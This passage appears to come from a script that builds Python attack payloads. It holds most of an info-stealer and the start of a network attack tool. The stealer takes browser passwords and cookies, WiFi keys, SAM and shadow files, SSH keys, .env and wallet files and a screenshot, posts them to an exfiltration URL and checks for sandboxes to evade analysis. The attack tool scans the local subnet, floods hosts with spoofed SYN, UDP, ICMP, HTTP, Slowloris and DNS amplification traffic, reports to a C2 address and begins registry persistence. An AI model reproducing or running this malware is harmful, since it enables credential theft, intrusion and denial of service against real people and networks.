        log_file = temp_dir / f"stealer_log_{int(time.time())}.log"
        
        handler = logging.FileHandler(log_file)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
    
    def info(self, message):
        self.logger.info(message)
    
    def error(self, message):
        self.logger.error(message)
    
    def warning(self, message):
        self.logger.warning(message)

logger = StealerLogger()

class AdvancedInfoStealer:
    def __init__(self):
        self.system_info = platform.system()
        self.username = os.environ.get('USER') or os.environ.get('USERNAME')
        self.hostname = platform.node()
        self.collected_data = {
            'system_info': {},
            'browser_data': {},
            'credentials': {},
            'files': {},
            'network': {},
            'screenshot': None
        }
        
    def _get_system_info(self):
        """Collect comprehensive system information"""
        try:
            info = {
                'hostname': self.hostname,
                'username': self.username,
                'platform': platform.system(),
                'platform_release': platform.release(),
                'platform_version': platform.version(),
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'cpu_count': psutil.cpu_count(),
                'cpu_percent': psutil.cpu_percent(),
                'memory_total': psutil.virtual_memory().total,
                'memory_available': psutil.virtual_memory().available,
                'disk_usage': psutil.disk_usage('/').total,
                'disk_free': psutil.disk_usage('/').free,
                'boot_time': psutil.boot_time(),
                'network_interfaces': [],
                'running_processes': [],
                'installed_programs': [],
                'environment_variables': dict(os.environ)
            }
            
            # Network interfaces
            for interface, addrs in psutil.net_if_addrs().items():
                interface_info = {
                    'interface': interface,
                    'addresses': []
                }
                for addr in addrs:
                    interface_info['addresses'].append({
                        'family': str(addr.family),
                        'address': addr.address,
                        'netmask': addr.netmask,
                        'broadcast': addr.broadcast
                    })
                info['network_interfaces'].append(interface_info)
            
            # Running processes
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
                try:
                    info['running_processes'].append(proc.info)
                except:
                    continue
            
            # Installed programs (Windows)
            if self.system_info == "Windows":
                try:
                    programs = []
                    for key_path in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                                    r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
                        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                            for i in range(winreg.QueryInfoKey(key)[0]):
                                try:
                                    subkey_name = winreg.EnumKey(key, i)
                                    with winreg.OpenKey(key, subkey_name) as subkey:
                                        program_info = {}
                                        try:
                                            program_info['name'] = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                        except:
                                            continue
                                        try:
                                            program_info['version'] = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                                        except:
                                            pass
                                        try:
                                            program_info['publisher'] = winreg.QueryValueEx(subkey, "Publisher")[0]
                                        except:
                                            pass
                                        programs.append(program_info)
                                except:
                                    continue
                    info['installed_programs'] = programs
                except:
                    pass
            
            self.collected_data['system_info'] = info
            logger.info("System information collected")
            return True
        except Exception as e:
            logger.error(f"Error collecting system info: {e}")
            return False
    
    def _decrypt_chrome_password(self, ciphertext, master_key):
        """Decrypt Chrome password"""
        try:
            iv = ciphertext[3:15]
            payload = ciphertext[15:]
            cipher = win32crypt.CryptUnprotectData(payload, None, None, None, 0, 1)
            return cipher[1].decode('utf-8')
        except:
            return None
    
    def _get_chrome_data(self):
        """Collect Chrome data"""
        try:
            chrome_path = BROWSER_PROFILES['chrome'][self.system_info.lower()]
            if not os.path.exists(chrome_path):
                return False
            
            chrome_data = {
                'passwords': [],
                'cookies': [],
                'history': [],
                'bookmarks': [],
                'extensions': []
            }
            
            # Get master key
            master_key = None
            try:
                with open(os.path.join(chrome_path, 'Local State'), 'r') as f:
                    local_state = json.load(f)
                master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                master_key = master_key[5:]  # Remove DPAPI prefix
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0, 1)[1]
            except:
                pass
            
            # Extract passwords
            try:
                conn = sqlite3.connect(os.path.join(chrome_path, 'Login Data'))
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    url, username, password = row
                    if master_key:
                        decrypted_password = self._decrypt_chrome_password(password, master_key)
                    else:
                        decrypted_password = "<encrypted>"
                    
                    chrome_data['passwords'].append({
                        'url': url,
                        'username': username,
                        'password': decrypted_password
                    })
                conn.close()
            except Exception as e:
                logger.error(f"Error extracting Chrome passwords: {e}")
            
            # Extract cookies
            try:
                conn = sqlite3.connect(os.path.join(chrome_path, 'Cookies'))
                cursor = conn.cursor()
                cursor.execute("SELECT name, value, host_key, path, expires_utc FROM cookies")
                for row in cursor.fetchall():
                    name, value, host, path, expires = row
                    chrome_data['cookies'].append({
                        'name': name,
                        'value': value,
                        'host': host,
                        'path': path,
                        'expires': expires
                    })
                conn.close()
            except Exception as e:
                logger.error(f"Error extracting Chrome cookies: {e}")
            
            # Extract history
            try:
                conn = sqlite3.connect(os.path.join(chrome_path, 'History'))
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
                for row in cursor.fetchall():
                    url, title, visit_count, last_visit = row
                    chrome_data['history'].append({
                        'url': url,
                        'title': title,
                        'visit_count': visit_count,
                        'last_visit': last_visit
                    })
                conn.close()
            except Exception as e:
                logger.error(f"Error extracting Chrome history: {e}")
            
            # Extract bookmarks
            try:
                with open(os.path.join(chrome_path, 'Bookmarks'), 'r') as f:
                    bookmarks = json.load(f)
                    chrome_data['bookmarks'] = bookmarks
            except Exception as e:
                logger.error(f"Error extracting Chrome bookmarks: {e}")
            
            # Extract extensions
            try:
                extensions_path = os.path.join(chrome_path, 'Extensions')
                if os.path.exists(extensions_path):
                    for ext_id in os.listdir(extensions_path):
                        ext_path = os.path.join(extensions_path, ext_id)
                        if os.path.isdir(ext_path):
                            for version in os.listdir(ext_path):
                                manifest_path = os.path.join(ext_path, version, 'manifest.json')
                                if os.path.exists(manifest_path):
                                    with open(manifest_path, 'r') as f:
                                        manifest = json.load(f)
                                        chrome_data['extensions'].append({
                                            'id': ext_id,
                                            'name': manifest.get('name', 'Unknown'),
                                            'version': manifest.get('version', 'Unknown'),
                                            'description': manifest.get('description', '')
                                        })
            except Exception as e:
                logger.error(f"Error extracting Chrome extensions: {e}")
            
            self.collected_data['browser_data']['chrome'] = chrome_data
            logger.info("Chrome data collected")
            return True
        except Exception as e:
            logger.error(f"Error collecting Chrome data: {e}")
            return False
    
    def _get_firefox_data(self):
        """Collect Firefox data"""
        try:
            firefox_path = BROWSER_PROFILES['firefox'][self.system_info.lower()]
            if not os.path.exists(firefox_path):
                return False
            
            firefox_data = {
                'passwords': [],
                'cookies': [],
                'history': [],
                'bookmarks': [],
                'extensions': []
            }
            
            # Find profile directory
            profile_dir = None
            for item in os.listdir(firefox_path):
                if item.endswith('.default') or item.endswith('.default-release'):
                    profile_dir = os.path.join(firefox_path, item)
                    break
            
            if not profile_dir:
                return False
            
            # Extract passwords
            try:
                # Firefox passwords are more complex to extract
                # This is a simplified version
                logins_path = os.path.join(profile_dir, 'logins.json')
                if os.path.exists(logins_path):
                    with open(logins_path, 'r') as f:
                        logins = json.load(f)
                        for login in logins.get('logins', []):
                            firefox_data['passwords'].append({
                                'url': login.get('hostname', ''),
                                'username': login.get('username', ''),
                                'password': '<encrypted>'
                            })
            except Exception as e:
                logger.error(f"Error extracting Firefox passwords: {e}")
            
            # Extract cookies
            try:
                conn = sqlite3.connect(os.path.join(profile_dir, 'cookies.sqlite'))
                cursor = conn.cursor()
                cursor.execute("SELECT name, value, host, path, expiry FROM moz_cookies")
                for row in cursor.fetchall():
                    name, value, host, path, expiry = row
                    firefox_data['cookies'].append({
                        'name': name,
                        'value': value,
                        'host': host,
                        'path': path,
                        'expiry': expiry
                    })
                conn.close()
            except Exception as e:
                logger.error(f"Error extracting Firefox cookies: {e}")
            
            # Extract history
            try:
                conn = sqlite3.connect(os.path.join(profile_dir, 'places.sqlite'))
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places")
                for row in cursor.fetchall():
                    url, title, visit_count, last_visit = row
                    firefox_data['history'].append({
                        'url': url,
                        'title': title,
                        'visit_count': visit_count,
                        'last_visit': last_visit
                    })
                conn.close()
            except Exception as e:
                logger.error(f"Error extracting Firefox history: {e}")
            
            self.collected_data['browser_data']['firefox'] = firefox_data
            logger.info("Firefox data collected")
            return True
        except Exception as e:
            logger.error(f"Error collecting Firefox data: {e}")
            return False
    
    def _get_wifi_passwords(self):
        """Collect WiFi passwords"""
        try:
            wifi_passwords = []
            
            if self.system_info == "Windows":
                # Get WiFi profiles
                result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                      capture_output=True, text=True)
                profiles = [line.split(':')[1].strip() for line in result.stdout.split('\n') 
                           if 'All User Profile' in line]
                
                for profile in profiles:
                    # Get password for each profile
                    result = subprocess.run(['netsh', 'wlan', 'show', 'profile', 
                                          profile, 'key=clear'], 
                                          capture_output=True, text=True)
                    for line in result.stdout.split('\n'):
                        if 'Key Content' in line:
                            password = line.split(':')[1].strip()
                            wifi_passwords.append({
                                'ssid': profile,
                                'password': password
                            })
                            break
            
            elif self.system_info == "Linux":
                # NetworkManager profiles
                nm_path = '/etc/NetworkManager/system-connections/'
                if os.path.exists(nm_path):
                    for file in os.listdir(nm_path):
                        file_path = os.path.join(nm_path, file)
                        try:
                            with open(file_path, 'r') as f:
                                content = f.read()
                                ssid = None
                                password = None
                                for line in content.split('\n'):
                                    if line.startswith('ssid='):
                                        ssid = line.split('=')[1]
                                    elif line.startswith('psk='):
                                        password = line.split('=')[1]
                                if ssid and password:
                                    wifi_passwords.append({
                                        'ssid': ssid,
                                        'password': password
                                    })
                        except:
                            continue
            
            self.collected_data['credentials']['wifi'] = wifi_passwords
            logger.info(f"Collected {len(wifi_passwords)} WiFi passwords")
            return True
        except Exception as e:
            logger.error(f"Error collecting WiFi passwords: {e}")
            return False
    
    def _get_system_credentials(self):
        """Collect system credentials"""
        try:
            credentials = {}
            
            if self.system_info == "Windows":
                # Windows credentials
                try:
                    # SAM file (requires admin)
                    sam_path = os.path.expandvars(r'%SystemRoot%\System32\config\SAM')
                    if os.path.exists(sam_path):
                        try:
                            shutil.copy2(sam_path, os.path.join(COLLECTION_DIR, 'SAM'))
                            credentials['sam'] = 'copied'
                        except:
                            pass
                    
                    # LSA secrets
                    lsa_path = os.path.expandvars(r'%SystemRoot%\System32\config\SYSTEM')
                    if os.path.exists(lsa_path):
                        try:
                            shutil.copy2(lsa_path, os.path.join(COLLECTION_DIR, 'SYSTEM'))
                            credentials['system'] = 'copied'
                        except:
                            pass
                    
                    # Credential Manager
                    result = subprocess.run(['cmdkey', '/list'], capture_output=True, text=True)
                    credentials['credential_manager'] = result.stdout
                
                except Exception as e:
                    logger.error(f"Error collecting Windows credentials: {e}")
            
            elif self.system_info == "Linux":
                # Linux credentials
                try:
                    # /etc/shadow (requires root)
                    shadow_path = '/etc/shadow'
                    if os.path.exists(shadow_path):
                        try:
                            shutil.copy2(shadow_path, os.path.join(COLLECTION_DIR, 'shadow'))
                            credentials['shadow'] = 'copied'
                        except:
                            pass
                    
                    # SSH keys
                    ssh_path = os.path.expanduser('~/.ssh')
                    if os.path.exists(ssh_path):
                        for file in os.listdir(ssh_path):
                            if file.startswith('id_'):
                                try:
                                    shutil.copy2(os.path.join(ssh_path, file), 
                                               os.path.join(COLLECTION_DIR, f'ssh_{file}'))
                                    credentials[f'ssh_{file}'] = 'copied'
                                except:
                                    pass
                
                except Exception as e:
                    logger.error(f"Error collecting Linux credentials: {e}")
            
            self.collected_data['credentials'].update(credentials)
            logger.info("System credentials collected")
            return True
        except Exception as e:
            logger.error(f"Error collecting system credentials: {e}")
            return False
    
    def _get_sensitive_files(self):
        """Collect sensitive files"""
        try:
            files_collected = []
            
            # File patterns to search for
            patterns = [
                '**/*.env',
                '**/.env',
                '**/config.ini',
                '**/settings.ini',
                '**/secrets.txt',
                '**/passwords.txt',
                '**/private.key',
                '**/*.pem',
                '**/*.p12',
                '**/*.pfx',
                '**/wallet.dat',
                '**/keystore.json'
            ]
            
            # Search in user directories
            search_dirs = [
                os.path.expanduser('~'),
                os.path.expanduser('~/Desktop'),
                os.path.expanduser('~/Documents'),
                os.path.expanduser('~/Downloads')
            ]
            
            for search_dir in search_dirs:
                if not os.path.exists(search_dir):
                    continue
                
                for pattern in patterns:
                    for file_path in Path(search_dir).glob(pattern):
                        try:
                            if file_path.stat().st_size > MAX_FILE_SIZE:
                                continue
                            
                            # Read file content
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                            
                            files_collected.append({
                                'path': str(file_path),
                                'content': content,
                                'size': file_path.stat().st_size
                            })
                        except Exception as e:
                            logger.error(f"Error reading file {file_path}: {e}")
                            continue
            
            self.collected_data['files'] = files_collected
            logger.info(f"Collected {len(files_collected)} sensitive files")
            return True
        except Exception as e:
            logger.error(f"Error collecting sensitive files: {e}")
            return False
    
    def _take_screenshot(self):
        """Take screenshot"""
        try:
            from PIL import ImageGrab
            
            screenshot = ImageGrab.grab()
            screenshot_path = os.path.join(COLLECTION_DIR, 'screenshot.png')
            screenshot.save(screenshot_path, 'PNG')
            
            # Convert to base64
            with open(screenshot_path, 'rb') as f:
                screenshot_data = base64.b64encode(f.read()).decode()
            
            self.collected_data['screenshot'] = screenshot_data
            logger.info("Screenshot taken")
            return True
        except Exception as e:
            logger.error(f"Error taking screenshot: {e}")
            return False
    
    def _get_network_info(self):
        """Collect network information"""
        try:
            network_info = {
                'active_connections': [],
                'listening_ports': [],
                'arp_table': [],
                'route_table': []
            }
            
            # Active connections
            for conn in psutil.net_connections():
                if conn.status == 'ESTABLISHED':
                    network_info['active_connections'].append({
                        'local_address': f"{conn.laddr.ip}:{conn.laddr.port}",
                        'remote_address': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                        'status': conn.status,
                        'pid': conn.pid
                    })
            
            # Listening ports
            for conn in psutil.net_connections():
                if conn.status == 'LISTEN':
                    network_info['listening_ports'].append({
                        'address': f"{conn.laddr.ip}:{conn.laddr.port}",
                        'pid': conn.pid
                    })
            
            # ARP table
            if self.system_info == "Windows":
                result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'dynamic' in line or 'static' in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            network_info['arp_table'].append({
                                'ip': parts[1],
                                'mac': parts[2],
                                'type': parts[3] if len(parts) > 3 else 'unknown'
                            })
            
            self.collected_data['network'] = network_info
            logger.info("Network information collected")
            return True
        except Exception as e:
            logger.error(f"Error collecting network info: {e}")
            return False
    
    def _create_archive(self):
        """Create archive of collected data"""
        try:
            import zipfile
            
            # Save collected data as JSON
            data_file = os.path.join(COLLECTION_DIR, 'collected_data.json')
            with open(data_file, 'w') as f:
                json.dump(self.collected_data, f, indent=2)
            
            # Create zip archive
            with zipfile.ZipFile(ZIP_FILE, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(COLLECTION_DIR):
                    for file in files:
                        if file != os.path.basename(ZIP_FILE):
                            file_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_path, COLLECTION_DIR)
                            zipf.write(file_path, arcname)
            
            logger.info(f"Created archive with {len(os.listdir(COLLECTION_DIR))} files")
            return True
        except Exception as e:
            logger.error(f"Error creating archive: {e}")
            return False
    
    def _exfiltrate_data(self):
        """Exfiltrate collected data"""
        try:
            if not os.path.exists(ZIP_FILE):
                return False
            
            # Read archive
            with open(ZIP_FILE, 'rb') as f:
                data = f.read()
            
            # Send to C2 server
            files = {
                'data': (f'steal_{self.hostname}_{int(time.time())}.zip', data, 'application/zip')
            }
            
            metadata = {
                'hostname': self.hostname,
                'username': self.username,
                'platform': self.system_info,
                'timestamp': time.time(),
                'size': len(data)
            }
            
            response = requests.post(EXFIL_URL, files=files, data=metadata, timeout=30)
            
            if response.status_code == 200:
                logger.info("Data successfully exfiltrated")
                return True
            else:
                logger.error(f"Failed to exfiltrate data: HTTP {response.status_code}")
                return False
        except Exception as e:
            logger.error(f"Error exfiltrating data: {e}")
            return False
    
    def steal_data(self):
        """Main data collection function"""
        try:
            logger.info("Starting data collection")
            
            # Collect all data
            self._get_system_info()
            self._get_chrome_data()
            self._get_firefox_data()
            self._get_wifi_passwords()
            self._get_system_credentials()
            self._get_sensitive_files()
            self._take_screenshot()
            self._get_network_info()
            
            # Create archive
            if self._create_archive():
                # Exfiltrate data
                if self._exfiltrate_data():
                    logger.info("Data collection and exfiltration complete")
                    return True
                else:
                    logger.error("Failed to exfiltrate data")
                    return False
            else:
                logger.error("Failed to create archive")
                return False
        except Exception as e:
            logger.error(f"Error in steal_data: {e}")
            return False
    
    def _cleanup(self):
        """Clean up temporary files"""
        try:
            if os.path.exists(COLLECTION_DIR):
                shutil.rmtree(COLLECTION_DIR)
            logger.info("Temporary files cleaned up")
        except Exception as e:
            logger.error(f"Error cleaning up: {e}")

# Anti-analysis techniques
def anti_analysis():
    """Check for analysis environment"""
    try:
        # Check for virtualization
        if platform.system() == "Linux":
            vm_indicators = ['/proc/vz', '/proc/xen', '/dev/virtio-ports']
            for indicator in vm_indicators:
                if os.path.exists(indicator):
                    return False
        
        # Check for debugging
        debuggers = ['gdb', 'lldb', 'strace', 'ltrace']
        for debugger in debuggers:
            if subprocess.run(['pgrep', '-f', debugger], capture_output=True).returncode == 0:
                return False
        
        # Check for sandbox
        if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:
            return False
        
        return True
    except:
        return True

# Main execution
if __name__ == "__main__":
    # Anti-analysis check
    if not anti_analysis():
        sys.exit(1)
    
    # Initialize and run stealer
    stealer = AdvancedInfoStealer()
    try:
        if stealer.steal_data():
            logger.info("Stealing completed successfully")
        else:
            logger.error("Stealing failed")
    finally:
        stealer._cleanup()
EOP
            ;;
        6)  # Advanced Network Destroyer payload
            cat > "payload.py" << 'EOP'
import os, socket, subprocess, sys, time, logging, platform, threading
import json, random, hashlib, base64
import requests
import psutil
from pathlib import Path
from scapy.all import *
from cryptography.fernet import Fernet

# Configuration
SCAN_THREADS = 100
ATTACK_THREADS = 50
COMMON_PORTS = [22, 23, 53, 80, 135, 139, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 27017]
REPORT_URL = "http://example.com/api/attack"
ATTACK_ID = hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]
ATTACK_DURATION = 3600  # 1 hour
PACKET_SIZE = 1400

# Advanced logging
class NetworkDestroyerLogger:
    def __init__(self):
        self.logger = logging.getLogger('network_destroyer')
        self.logger.setLevel(logging.INFO)
        
        # Create log file in temp directory
        temp_dir = Path(tempfile.gettempdir())
        log_file = temp_dir / f"attack_log_{int(time.time())}.log"
        
        handler = logging.FileHandler(log_file)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
    
    def info(self, message):
        self.logger.info(message)
    
    def error(self, message):
        self.logger.error(message)
    
    def warning(self, message):
        self.logger.warning(message)

logger = NetworkDestroyerLogger()

class AdvancedNetworkDestroyer:
    def __init__(self):
        self.system_info = platform.system()
        self.hostname = platform.node()
        self.attack_id = ATTACK_ID
        self.targets = []
        self.attacked_hosts = set()
        self.stop_event = threading.Event()
        self.start_time = time.time()
        
    def _get_local_ip(self):
        """Get the local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception as e:
            logger.error(f"Error getting local IP: {e}")
            return "127.0.0.1"
    
    def _get_subnet(self):
        """Get the subnet from local IP"""
        try:
            ip = self._get_local_ip()
            return '.'.join(ip.split('.')[:-1])
        except Exception as e:
            logger.error(f"Error getting subnet: {e}")
            return "192.168.1"
    
    def _scan_port(self, host, port, timeout=0.5):
        """Fast port scan"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def _scan_host(self, host, ports, results):
        """Scan all ports on a host"""
        try:
            open_ports = []
            for port in ports:
                if self._scan_port(host, port):
                    open_ports.append(port)
            
            if open_ports:
                results[host] = open_ports
                logger.info(f"[+] Found target: {host} with open ports: {open_ports}")
        except Exception as e:
            logger.error(f"Error scanning host {host}: {e}")
    
    def _scan_network(self):
        """Fast network scan"""
        try:
            subnet = self._get_subnet()
            logger.info(f"Scanning network: {subnet}.x")
            
            results = {}
            threads = []
            
            # Create thread pool for scanning
            for i in range(1, 255):
                ip = f"{subnet}.{i}"
                thread = threading.Thread(target=self._scan_host, args=(ip, COMMON_PORTS, results))
                thread.daemon = True
                threads.append(thread)
                
                # Limit concurrent threads
                if len(threads) >= SCAN_THREADS:
                    for t in threads:
                        t.start()
                    for t in threads:
                        t.join()
                    threads = []
            
            # Start remaining threads
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            
            self.targets = list(results.keys())
            self._report_scan_results(results)
            
            logger.info(f"Network scan complete. Found {len(self.targets)} targets.")
            return results
        except Exception as e:
            logger.error(f"Error in scan_network: {e}")
            return {}
    
    def _syn_flood(self, target_ip, target_port, duration=60):
        """SYN flood attack"""
        try:
            logger.info(f"Starting SYN flood on {target_ip}:{target_port}")
            
            end_time = time.time() + duration
            packets_sent = 0
            
            while time.time() < end_time and not self.stop_event.is_set():
                # Create random IP for spoofing
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                src_port = random.randint(1024, 65535)
                
                # Create SYN packet
                ip_layer = IP(src=src_ip, dst=target_ip)
                tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))
                
                packet = ip_layer / tcp_layer
                
                # Send packet
                send(packet, verbose=0)
                packets_sent += 1
                
                # Small delay to avoid overwhelming local system
                time.sleep(0.001)
            
            logger.info(f"SYN flood completed. Sent {packets_sent} packets to {target_ip}:{target_port}")
            return True
        except Exception as e:
            logger.error(f"Error in SYN flood: {e}")
            return False
    
    def _udp_flood(self, target_ip, target_port, duration=60):
        """UDP flood attack"""
        try:
            logger.info(f"Starting UDP flood on {target_ip}:{target_port}")
            
            end_time = time.time() + duration
            packets_sent = 0
            
            while time.time() < end_time and not self.stop_event.is_set():
                # Create UDP packet with random data
                ip_layer = IP(dst=target_ip)
                udp_layer = UDP(sport=random.randint(1024, 65535), dport=target_port)
                payload = RandString(size=PACKET_SIZE)
                
                packet = ip_layer / udp_layer / payload
                
                # Send packet
                send(packet, verbose=0)
                packets_sent += 1
                
                time.sleep(0.001)
            
            logger.info(f"UDP flood completed. Sent {packets_sent} packets to {target_ip}:{target_port}")
            return True
        except Exception as e:
            logger.error(f"Error in UDP flood: {e}")
            return False
    
    def _icmp_flood(self, target_ip, duration=60):
        """ICMP flood attack"""
        try:
            logger.info(f"Starting ICMP flood on {target_ip}")
            
            end_time = time.time() + duration
            packets_sent = 0
            
            while time.time() < end_time and not self.stop_event.is_set():
                # Create ICMP packet
                ip_layer = IP(dst=target_ip)
                icmp_layer = ICMP()
                payload = RandString(size=PACKET_SIZE)
                
                packet = ip_layer / icmp_layer / payload
                
                # Send packet
                send(packet, verbose=0)
                packets_sent += 1
                
                time.sleep(0.001)
            
            logger.info(f"ICMP flood completed. Sent {packets_sent} packets to {target_ip}")
            return True
        except Exception as e:
            logger.error(f"Error in ICMP flood: {e}")
            return False
    
    def _http_flood(self, target_ip, target_port, duration=60):
        """HTTP flood attack"""
        try:
            logger.info(f"Starting HTTP flood on {target_ip}:{target_port}")
            
            end_time = time.time() + duration
            requests_sent = 0
            
            while time.time() < end_time and not self.stop_event.is_set():
                try:
                    # Create HTTP request
                    url = f"http://{target_ip}:{target_port}/"
                    headers = {
                        'User-Agent': f'Mozilla/5.0 (Random {random.randint(1000, 9999)})',
                        'Accept': '*/*',
                        'Connection': 'keep-alive'
                    }
                    
                    # Send request
                    response = requests.get(url, headers=headers, timeout=5)
                    requests_sent += 1
                    
                except:
                    requests_sent += 1
                
                time.sleep(0.01)
            
            logger.info(f"HTTP flood completed. Sent {requests_sent} requests to {target_ip}:{target_port}")
            return True
        except Exception as e:
            logger.error(f"Error in HTTP flood: {e}")
            return False
    
    def _dns_amplification(self, target_ip, duration=60):
        """DNS amplification attack"""
        try:
            logger.info(f"Starting DNS amplification on {target_ip}")
            
            # List of open DNS resolvers
            dns_servers = [
                '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
                '208.67.222.222', '208.67.220.220'
            ]
            
            end_time = time.time() + duration
            packets_sent = 0
            
            while time.time() < end_time and not self.stop_event.is_set():
                for dns_server in dns_servers:
                    try:
                        # Create DNS query with spoofed source IP
                        ip_layer = IP(src=target_ip, dst=dns_server)
                        udp_layer = UDP(sport=random.randint(1024, 65535), dport=53)
                        
                        # Create DNS query for ANY record
                        dns_layer = DNS(rd=1, qd=DNSQR(qname=random.choice(['google.com', 'facebook.com', 'amazon.com']), qtype='ANY'))
                        
                        packet = ip_layer / udp_layer / dns_layer
                        
                        # Send packet
                        send(packet, verbose=0)
                        packets_sent += 1
                        
                    except:
                        continue
                
                time.sleep(0.1)
            
            logger.info(f"DNS amplification completed. Sent {packets_sent} packets")
            return True
        except Exception as e:
            logger.error(f"Error in DNS amplification: {e}")
            return False
    
    def _slowloris_attack(self, target_ip, target_port, duration=60):
        """Slowloris attack"""
        try:
            logger.info(f"Starting Slowloris attack on {target_ip}:{target_port}")
            
            sockets = []
            end_time = time.time() + duration
            
            while time.time() < end_time and not self.stop_event.is_set():
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((target_ip, target_port))
                    
                    # Send partial HTTP header
                    s.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n".encode())
                    
                    sockets.append(s)
                    
                    # Send header fragment periodically
                    for sock in sockets:
                        try:
                            sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        except:
                            sockets.remove(sock)
                    
                    time.sleep(5)
                    
                except:
                    continue
            
            # Close all sockets
            for s in sockets:
                try:
                    s.close()
                except:
                    pass
            
            logger.info(f"Slowloris attack completed on {target_ip}:{target_port}")
            return True
        except Exception as e:
            logger.error(f"Error in Slowloris attack: {e}")
            return False
    
    def _attack_target(self, target_ip, target_port):
        """Choose and execute attack based on port"""
        try:
            logger.info(f"[!] Attacking {target_ip}:{target_port}")
            
            # Choose attack based on port
            if target_port == 22:
                # SSH - SYN flood
                return self._syn_flood(target_ip, target_port, 30)
            elif target_port == 80 or target_port == 8080:
                # HTTP - HTTP flood and Slowloris
                self._http_flood(target_ip, target_port, 30)
                return self._slowloris_attack(target_ip, target_port, 30)
            elif target_port == 53:
                # DNS - DNS amplification
                return self._dns_amplification(target_ip, 30)
            elif target_port in [139, 445]:
                # SMB - UDP flood
                return self._udp_flood(target_ip, target_port, 30)
            elif target_port == 3389:
                # RDP - SYN flood
                return self._syn_flood(target_ip, target_port, 30)
            else:
                # Generic - Random attack
                attack_type = random.choice(['syn', 'udp', 'icmp'])
                if attack_type == 'syn':
                    return self._syn_flood(target_ip, target_port, 30)
                elif attack_type == 'udp':
                    return self._udp_flood(target_ip, target_port, 30)
                else:
                    return self._icmp_flood(target_ip, 30)
        except Exception as e:
            logger.error(f"Error attacking {target_ip}:{target_port}: {e}")
            return False
    
    def _attack_targets(self, scan_results):
        """Attack all discovered targets"""
        try:
            logger.info(f"Starting attack phase on {len(scan_results)} targets")
            
            threads = []
            
            for host, ports in scan_results.items():
                if host in self.attacked_hosts:
                    continue
                
                for port in ports:
                    if time.time() - self.start_time > ATTACK_DURATION:
                        break
                    
                    thread = threading.Thread(target=self._attack_target, args=(host, port))
                    thread.daemon = True
                    threads.append(thread)
                    
                    # Limit concurrent threads
                    if len(threads) >= ATTACK_THREADS:
                        for t in threads:
                            t.start()
                        for t in threads:
                            t.join()
                        threads = []
                    
                    self.attacked_hosts.add(host)
            
            # Start remaining threads
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            
            # Report results
            self._report_attack_results()
            
            logger.info(f"Attack complete. Attacked {len(self.attacked_hosts)} hosts.")
            return True
        except Exception as e:
            logger.error(f"Error in attack_targets: {e}")
            return False
    
    def _report_scan_results(self, results):
        """Report scan results to C2 server"""
        try:
            data = {
                "type": "scan_results",
                "attack_id": self.attack_id,
                "source_ip": self._get_local_ip(),
                "timestamp": time.time(),
                "results": results
            }
            
            # Send to C2 server
            try:
                response = requests.post(REPORT_URL, json=data, timeout=10)
                if response.status_code == 200:
                    logger.info("Scan results reported successfully")
            except:
                logger.warning("Failed to report scan results")
            
            return True
        except Exception as e:
            logger.error(f"Error reporting scan results: {e}")
            return False
    
    def _report_attack_results(self):
        """Report attack results to C2 server"""
        try:
            data = {
                "type": "attack_results",
                "attack_id": self.attack_id,
                "source_ip": self._get_local_ip(),
                "timestamp": time.time(),
                "attacked_hosts": list(self.attacked_hosts),
                "duration": time.time() - self.start_time
            }
            
            # Send to C2 server
            try:
                response = requests.post(REPORT_URL, json=data, timeout=10)
                if response.status_code == 200:
                    logger.info("Attack results reported successfully")
            except:
                logger.warning("Failed to report attack results")
            
            return True
        except Exception as e:
            logger.error(f"Error reporting attack results: {e}")
            return False
    
    def _persistence(self):
        """Establish persistence"""
        try:
            if self.system_info == "Windows":
                # Add to Windows registry
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0,
                    winreg.KEY_SET_VALUE
                )
